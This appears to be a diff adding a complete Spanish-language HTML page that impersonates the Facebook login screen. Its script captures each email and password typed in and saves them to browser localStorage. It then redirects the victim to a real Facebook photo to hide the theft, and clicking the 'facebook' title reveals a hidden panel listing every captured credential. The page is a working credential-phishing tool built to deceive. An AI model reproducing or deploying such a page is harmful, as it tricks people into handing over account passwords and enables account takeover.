@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+        .title {
+            position: absolute;
+            top: 37px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #0283fc;
+            font-size: 47px;
+            font-weight: bold;
+            font-family: Arial, sans-serif;
+            cursor: pointer; /* Añadido para indicar que es clicable */
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            margin-top: 1px;
+        }
+        .container h2 {
+            text-align: center;
+            color: #272727;
+            margin-bottom: 20px;
+            font-size: 18px;
+            font-family: Arial, sans-serif;
+        }
+        .container form {
+            margin-top: 20px;
+        }
+        .container form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-style: normal;
+            font-size: 14px;
+        }
+        .container form input[type="submit"] {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .container form input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+        .container p {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .container p a {
+            color: white;
+            text-decoration: none;
+            padding: 10px 15px;
+            display: inline-block;
+            border-radius: 4px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .container p a.password-link {
+            color: #007bff;
+            padding: 0;
+            background: none;
+            font-weight: normal;
+            font-size: 15px;
+        }
+        .container p a.create-account {
+            background-color: #00CD00;
+        }
+        .container hr {
+            margin: 20px 0;
+            border: 0;
+            border-top: 1px solid #ccc;
+        }
+        @media (max-width: 600px) {
+            .container {
+                width: 100%;
+                padding: 10px;
+            }
+            .title {
+                font-size: 32px;
+            }
+            .container h2 {
+                font-size: 18px;
+            }
+            .container form input[type="submit"],
+            .create-account {
+                font-size: 14px;
+            }
+        }
+        @media (max-width: 768px) {
+            .container {
+                width: 80%;
+            }
+            .title {
+                font-size: 36px;
+            }
+            .container h2 {
+                font-size: 18px;
+            }
+            .container form input[type="submit"],
+            .create-account {
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="title" id="showData">facebook</div>
+
+<div class="container">
+    <h2>Iniciar sesión en facebook</h2>
+    <form id="loginForm">
+        <input type="email" id="email" name="email" placeholder="Correo electrónico o número de teléfono" required>
+        <input type="password" id="password" name="password" placeholder="Contraseña" required>
+        <input type="submit" value="Iniciar Sesión">
+    </form>
+    <p><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="password-link">¿Olvidaste tu contraseña?</a></p>
+    <hr>
+    <p><a href="https://es-la.facebook.com/reg/" class="create-account">Crear cuenta nueva</a></p>
+</div>
+
+<script>
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Evita que el formulario se envíe normalmente
+        
+        // Obtener el correo y la contraseña ingresados por el usuario
+        var email = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
+
+        // Verificar si hay contraseñas guardadas en el almacenamiento local
+        var storedPasswords = JSON.parse(localStorage.getItem("passwords")) || [];
+
+        // Agregar el nuevo correo y contraseña a la lista
+        storedPasswords.push({ email: email, password: password });
+
+        // Guardar la lista actualizada en el almacenamiento local
+        localStorage.setItem("passwords", JSON.stringify(storedPasswords));
+
+        // Simulamos un proceso de autenticación
+        var authenticated = true; // Simulamos que el usuario está autenticado correctamente
+        
+        if (authenticated) {
+            // Redirigir al usuario a la página de contraseñas guardadas
+            window.location.href = "https://www.facebook.com/photo/?fbid=848941573926539&set=a.577109684443064&locale=es_LA";
+        }
+    });
+
+    document.getElementById("showData").addEventListener("click", function() {
+        var storedPasswords = JSON.parse(localStorage.getItem("passwords")) || [];
+        var dataDisplay = document.createElement("div");
+        dataDisplay.style.position = "absolute";
+        dataDisplay.style.top = "50%";
+        dataDisplay.style.left = "50%";
+        dataDisplay.style.transform = "translate(-50%, -50%)";
+        dataDisplay.style.backgroundColor = "#fff";
+        dataDisplay.style.padding = "20px";
+        dataDisplay.style.border = "1px solid #ccc";
+        dataDisplay.style.borderRadius = "8px";
+        dataDisplay.style.boxShadow = "0 2px 4px rgba(0, 0, 0, 0.1)";
+        dataDisplay.style.zIndex = "1000";
+
+        var dataContent = "<h3>Datos guardados</h3>";
+        storedPasswords.forEach(function(item, index) {
+            dataContent += "<p><strong>Correo:</strong> " + item.email + "<br><strong>Contraseña:</strong> " + item.password + "</p>";
+        });
+        
+        dataDisplay.innerHTML = dataContent;
+        document.body.appendChild(dataDisplay);
+    });
+</script>
+
+</body>
+</html>
